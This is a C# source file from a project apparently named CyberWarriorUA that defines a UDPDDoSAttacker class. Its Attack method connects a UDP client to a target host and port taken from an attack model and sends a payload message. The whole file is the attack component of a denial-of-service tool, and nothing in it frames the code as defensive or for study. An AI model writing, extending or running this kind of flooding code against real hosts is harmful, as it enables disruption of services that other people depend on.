using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using CyberWarriorUA.Models;

namespace CyberWarriorUA.Services
{
    public class UDPDDoSAttacker : DDoSBase
    {
        public UDPDDoSAttacker(AttackInfo attackModel) : base(attackModel)
        {
        }

        public override async Task Attack()
        {
            var udpClient = new UdpClient();
            udpClient.Connect(AttackModel.URL, AttackModel.Port);
            byte[] data = System.Text.Encoding.UTF8.GetBytes(AttackModel.Message);

            await udpClient.SendAsync(data, data.Length);

            udpClient.Close();
        }
    }
}
